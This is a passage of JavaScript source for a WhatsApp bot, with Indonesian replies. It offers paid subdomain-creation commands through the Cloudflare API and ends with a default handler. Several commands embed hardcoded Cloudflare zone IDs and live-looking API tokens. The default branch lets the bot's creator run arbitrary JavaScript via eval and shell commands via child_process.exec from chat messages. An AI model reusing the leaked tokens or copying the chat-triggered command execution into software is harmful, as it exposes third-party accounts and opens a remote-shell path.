                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d59': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "4181daaa4a105c9b2b9be81dd85b42f7";
            let apitoken = "np1WPiPMLnFxgUvNL_5-HMd7YvlhumpqNVtugDyX"
            let tld = "diimz.site";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break
      case '/d60': {
        if (!isPrem) return replywa("𝙂𝙧𝙤𝙪𝙥 𝘽𝙚𝙡𝙪𝙢 𝘼𝙙𝙖 𝙄𝙯𝙞𝙣 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙢𝙗𝙪𝙖𝙩 𝙎𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣\n\n𝙅𝙞𝙠𝙖 𝙄𝙣𝙜𝙞𝙣 𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝘼𝙠𝙨𝙚𝙨 𝙐𝙣𝙩𝙪𝙠 𝙂𝙧𝙤𝙪𝙥 𝙄𝙣𝙞 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝘽𝙚𝙡𝙞 𝙆𝙚 wa.me/Alwaysaqioo")
        function subDomain1(host, ip) {
          return new Promise((resolve) => {
            let zone = "b263ae8b1bb47329a24aa3898de4f0b4";
            let apitoken = "A4E0OuHCDuUy09QCENX2t6suDS5EIIi3urJO101r"
            let tld = "didinsec.biz.id";
            axios
              .post(
                `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                {
                  headers: {
                    Authorization: "Bearer " + apitoken,
                    "Content-Type": "application/json",
                  },
                }
              )
              .then((e) => {
                let res = e.data;
                if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
              })
              .catch((e) => {
                let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                let err1Str = String(err1);
                resolve({ success: false, error: err1Str });
              });
          });
        }

        let raw1 = args?.join(" ")?.trim();
        if (!raw1) return replywa("mana host & ip nya?");
        let host1 = raw1
          .split("|")[0]
          .trim()
          .replace(/[^a-z0-9.-]/gi, "");
        if (!host1) return replywa("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
        let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
        if (!ip1 || ip1.split(".").length < 4) return replywa(ip1 ? "ip tidak valid" : "mana ip nya");

        subDomain1(host1, ip1).then((e) => {
          if (e['success']) replygw(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = 𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎\n┗━━━━━━━━━━━━━━━━━━━`);
          else replygw(`gagal membuat subdomain\nMsg: ${e['error']}`)
        });
      }
        break

      default:
        if (budy.startsWith('=>')) {
          if (!isCreator) return m.reply('*Only Vip*')
          function Return(sul) {
            sat = JSON.stringify(sul, null, 2)
            bang = util.format(sat)
            if (sat == undefined) {
              bang = util.format(sul)
            }
            return m.reply(bang)
          }
          try {
            m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
          } catch (e) {
            m.reply(String(e))
          }
        }
        if (budy.startsWith('>')) {
          if (!isCreator) return
          try {
            let evaled = await eval(budy.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            await m.reply(evaled)
          } catch (err) {
            await m.reply(String(err))
          }
        }

        if (budy.startsWith('$')) {
          if (!isCreator) return
          require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return m.reply(`${err}`)
            if (stdout) return m.reply(stdout)
          })
        }

    }
  } catch (err) {
    qio.sendMessage(m.chat, { text: require('util').format(err) }, { quoted: m })
    console.log('\x1b[1;31m' + err + '\x1b[0m')
  }
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})